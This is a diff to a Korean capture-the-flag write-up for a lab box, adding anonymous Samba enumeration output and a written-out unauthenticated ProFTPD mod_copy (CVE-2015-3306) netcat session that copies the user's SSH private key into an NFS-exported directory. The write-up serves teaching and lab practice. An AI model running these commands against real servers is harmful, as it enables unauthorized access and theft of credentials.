@@ -43,7 +43,26 @@ Samba부터 익명으로 붙어 봤습니다.
 smbclient -L //10.49.185.92/ -N
 ```
 
-`anonymous` 공유가 비밀번호 없이 열렸습니다. 안에 `log.txt`(12237B)가 있었는데, kenobi가 SSH 키를 만들 때 남긴 로그였습니다. 키를 `/home/kenobi/.ssh/id_rsa`에 passphrase 없이 생성했다는 내용과 ProFTPd·Samba 설정이 함께 드러나 있었고, `[anonymous]` 공유의 실제 경로가 `/home/kenobi/share`라는 것도 여기서 나왔습니다. 훔칠 키의 위치와, 그 키에 암호가 걸려 있지 않다는 사실이 이 한 파일에서 같이 정리된 셈입니다.
+```
+Sharename       Type      Comment
+---------       ----      -------
+print$          Disk      Printer Drivers
+anonymous       Disk
+IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
+```
+
+`anonymous` 공유가 비밀번호 없이 목록에 잡혔습니다. 그대로 그 공유에 익명으로 붙어 내용을 확인하고 `log.txt`를 내려받았습니다.
+
+```
+$ smbclient //10.49.185.92/anonymous -N
+smb: \> ls
+  .                                   D        0  Thu Aug 20 00:06:44 2026
+  ..                                  D        0  Sat Aug  9 09:03:22 2025
+  log.txt                             N    12237  Wed Sep  4 06:49:09 2019
+smb: \> get log.txt
+```
+
+단서는 `log.txt`(12237B)에 있었습니다. kenobi가 SSH 키를 만들 때 남긴 로그로, 키를 `/home/kenobi/.ssh/id_rsa`에 passphrase 없이 생성했다는 내용과 ProFTPd·Samba 설정이 함께 드러나 있었고, `[anonymous]` 공유의 실제 경로가 `/home/kenobi/share`라는 것도 여기서 나왔습니다. 훔칠 키의 위치와, 그 키에 암호가 걸려 있지 않다는 사실이 이 한 파일에서 같이 정리된 셈입니다.
 
 NFS로 밖에 열린 디렉터리도 확인했습니다.
 
@@ -55,9 +74,11 @@ showmount -e 10.49.185.92
 
 ## ProFTPD mod_copy로 키 반출
 
-ProFTPD 1.3.5는 mod_copy 취약점(CVE-2015-3306)을 안고 있습니다. 인증 절차 없이 `SITE CPFR`로 원본을, `SITE CPTO`로 목적지를 지정하면 서버 안의 파일을 임의 경로로 복사해 줍니다. searchsploit에 있는 EDB 36803은 웹 루트에 PHP 웹셸을 떨어뜨리는 걸 전제로 짜여 있어 이 박스에는 그대로 맞지 않았습니다. 스크립트를 통째로 쓰는 대신 복사 동작만 떼어다 `nc`로 직접 명령을 넣었습니다.
+ProFTPD 1.3.5는 mod_copy 취약점(CVE-2015-3306)을 안고 있습니다. mod_copy가 더해 주는 `SITE CPFR`(copy from)·`SITE CPTO`(copy to) 두 명령이 로그인 여부를 확인하지 않고 처리되는 것이 문제의 핵심입니다. 원본을 `CPFR`로, 목적지를 `CPTO`로 지정하면 서버가 자기 권한(ProFTPD 데몬 권한)으로 두 경로 사이를 그대로 복사합니다. `USER`/`PASS`를 한 번도 보내지 않은 익명 세션에서, 데몬 권한으로 읽을 수 있고 목적지에 쓸 수 있는 범위의 파일을 옮길 수 있다는 뜻입니다.
 
-노린 건 log.txt에서 확인한 개인키였고, NFS로 마운트되는 `/var` 아래로 옮겼습니다.
+searchsploit에 있는 EDB 36803은 웹 루트에 PHP 웹셸을 떨어뜨려 RCE로 잇는 걸 전제로 짜여 있어 이 박스에는 그대로 맞지 않았습니다. 여기서 필요한 건 코드 실행이 아니라 손이 닿지 않는 개인키를 닿는 곳으로 옮기는 복사 동작뿐이라, 스크립트를 통째로 쓰는 대신 그 primitive만 떼어다 `nc`로 21번 포트에 붙어 명령을 직접 타이핑했습니다.
+
+원본은 log.txt에서 위치를 확인한 개인키(`/home/kenobi/.ssh/id_rsa`)이고, 목적지는 앞서 `showmount`로 확인한, 누구에게나 export된 `/var` 아래(`/var/tmp/id_rsa`)로 잡았습니다. FTP로는 못 읽는 파일이라도 일단 NFS로 마운트되는 트리 안에 복사해 두면 그쪽에서 그대로 회수할 수 있기 때문입니다.
 
 ```
 $ nc 10.49.185.92 21
@@ -66,6 +87,8 @@ SITE CPFR /home/kenobi/.ssh/id_rsa
 SITE CPTO /var/tmp/id_rsa
 250 Copy successful
 ```
+
+`SITE CPFR` 뒤에 온 `350`은 FTP에서 "명령은 받았고 다음 정보(여기서는 목적지)를 기다린다"는 중간 응답입니다. 원본 경로를 받아들여 다음 단계로 넘어갔다는 신호일 뿐, 그 자체가 읽기 권한까지 보장하지는 않습니다. 복사가 실제로 성립했다는 근거는 이어진 `SITE CPTO`의 `250 Copy successful`입니다. `250`은 요청한 동작이 정상 완료됐다는 응답이라, 인증 없이 개인키 복사가 끝났다는 사실은 이 완료 응답으로 확정됩니다.
 
 ## NFS 마운트와 SSH foothold
 
